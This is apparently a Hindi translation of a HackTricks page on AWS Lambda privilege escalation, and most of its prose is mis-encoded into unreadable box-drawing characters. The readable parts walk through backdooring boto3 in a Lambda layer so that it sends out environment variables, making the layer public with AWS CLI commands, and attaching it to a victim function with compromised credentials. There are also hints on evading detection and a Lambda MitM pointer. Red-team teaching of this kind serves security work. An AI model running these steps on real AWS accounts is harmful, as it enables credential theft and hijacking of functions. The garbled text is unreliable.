рд╕реБрд░рдХреНрд╖рд┐рдд рд░рд╣рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо Pip рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕реА рд╡рд░реНрдЬрди рдХреА boto3 рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВрдЧреЗ рдЬреЛ Lambda рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдЯрд╛рд░рдЧреЗрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ (Python 3.7), рдмрд╕ рдЗрд╕рд▓рд┐рдП рдХрд┐ рдХреЛрдИ рднрд┐рдиреНрдирддрд╛ рди рд╣реЛ рдЬреЛ рдЯрд╛рд░рдЧреЗрдЯ рдлрдВрдХреНрд╢рди рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рдкреИрджрд╛ рдХрд░ рд╕рдХрддреА рд╣реИред рд╡рд░реНрддрдорд╛рди рдореЗрдВ рд╡рд╣ рд░рдирдЯрд╛рдЗрдо boto3 рд╡рд░реНрдЬрди 1.9.42 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде, рд╣рдо boto3 рд╡рд░реНрдЬрди 1.9.42 рдФрд░ рдЗрд╕рдХреА рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреЛ рдПрдХ рд╕реНрдерд╛рдиреАрдп "lambda\_layer" рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВрдЧреЗ:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
рдЖрдЧреЗ, рд╣рдо `/lambda_layer/boto3/__init__.py` рдЦреЛрд▓реЗрдВрдЧреЗ рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЬреЛрдбрд╝реЗрдВрдЧреЗред рдЬреЛ рдкреЗрд▓реЛрдб рд╣рдо рдЬреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВ рд╡рд╣ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (26).png>)

`requests` рдХреЛ `botocore` рд╕реЗ рдЗрдореНрдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдлрдВрдХреНрд╢рди env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдЧрд╛, рдФрд░ try-except рдФрд░ 0.1 рдЯрд╛рдЗрдордЖрдЙрдЯ рдЗрд╕рд▓рд┐рдП рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдХреЛрдб рдХреБрдЫ рднреА рддреЛрдбрд╝реЗ рдирд╣реАрдВред

{% hint style="info" %}
**рдорд╣рддреНрд╡рдкреВрд░реНрдг рдиреЛрдЯ:** рдЖрдкрдХреЛ рдЕрд╕рд▓реА рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ `from botocore.vendored import requests` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдЙрд╕ рдлрдВрдХреНрд╢рди рдХреЗ CloudWatch рд▓реЙрдЧреНрд╕ рдореЗрдВ тАЬDeprecationWarningтАЭ рдкреНрд░рд┐рдВрдЯ рд╣реЛрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ рдПрдХ рдбрд┐рдлреЗрдВрдбрд░ рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдЕрдм, рдЙрд╕ рдХреЛрдб рдХреЛ рдПрдХ **ZIP рдлрд╛рдЗрд▓** рдореЗрдВ рдмрдВрдбрд▓ рдХрд░реЗрдВ рдФрд░ **ATTACKER рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдПрдХ рдирдП Lambda layer рдореЗрдВ рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВред рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдПрдХ тАЬpythonтАЭ рдлреЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЙрд╕рдореЗрдВ рдЕрдкрдиреА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдбрд╛рд▓рдиреА рд╣реЛрдВрдЧреА рддрд╛рдХрд┐ рдЬрдм рд╣рдо рдЗрд╕реЗ Lambda рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рддреЛ рдХреЛрдб тАЬ/opt/python/boto3тАЭ рдореЗрдВ рдорд┐рд▓реЗрдЧрд╛ред рд╕рд╛рде рд╣реА, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд▓реЗрдпрд░ Python 3.7 рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рд╣реИ рдФрд░ **рд▓реЗрдпрд░ рд╣рдорд╛рд░реЗ рд▓рдХреНрд╖реНрдп рдлрдВрдХреНрд╢рди рдХреЗ рд╕рдорд╛рди рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реИ**ред рдПрдХ рдмрд╛рд░ рдпрд╣ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо `lambda:AddLayerVersionPermission` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд▓реЗрдпрд░ рдХреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╕реБрд▓рдн рдмрдирд╛рдПрдВрдЧреЗ** рддрд╛рдХрд┐ рд╣рдорд╛рд░рд╛ рд▓рдХреНрд╖реНрдп рдЕрдХрд╛рдЙрдВрдЯ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗред рдЗрд╕ API рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╡реНрдпрдХреНрддрд┐рдЧрдд AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
рдЕрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЬреЛ **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╣реИрдВ, рд╣рдо рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рд╣рдорд╛рд░реЗ рд▓рдХреНрд╖реНрдп Lambda рдлрдВрдХреНрд╢рди "s3-getter" рдкрд░ рдЪрд▓рд╛рдПрдВрдЧреЗ, рдЬреЛ **рд╣рдорд╛рд░реА рдХреНрд░реЙрд╕-рдЕрдХрд╛рдЙрдВрдЯ Lambda рд▓реЗрдпрд░ рдХреЛ рдЕрдЯреИрдЪ рдХрд░реЗрдЧрд╛**ред
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
рдЕрдЧрд▓рд╛ рдХрджрдо рдпрд╛ рддреЛ **рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реНрд╡рдпрдВ рдЗрдиреНрд╡реЛрдХ рдХрд░рдирд╛** рд╣реЛрдЧрд╛ рдЕрдЧрд░ рд╣рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдлрд┐рд░ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдпрд╣ **рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╕реЗ рдЗрдиреНрд╡реЛрдХ рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛**тАУрдЬреЛ рдХрд┐ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХрд╛ рд╣реИред

рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдиреЗ рдХрд╛ **рдПрдХ рдФрд░ рдЧреБрдкреНрдд рддрд░реАрдХрд╛** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд▓реИрдореНрдмреНрдбрд╛ рд╕рд░реНрд╡рд┐рд╕ рд░реЛрд▓ рдХрд╛ рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

рд╢рд╛рдпрдж рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ URL рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдореИрдВ рдЗрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдвреВрдВрдв рдкрд╛рдпрд╛, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдореБрдЭреЗ рдмрддрд╛рдПрдВ!

### Lambda MitM

рдХреБрдЫ рд▓реИрдореНрдмреНрдбрд╛рд╕ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред** рдЕрдЧрд░ рдЖрдк рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
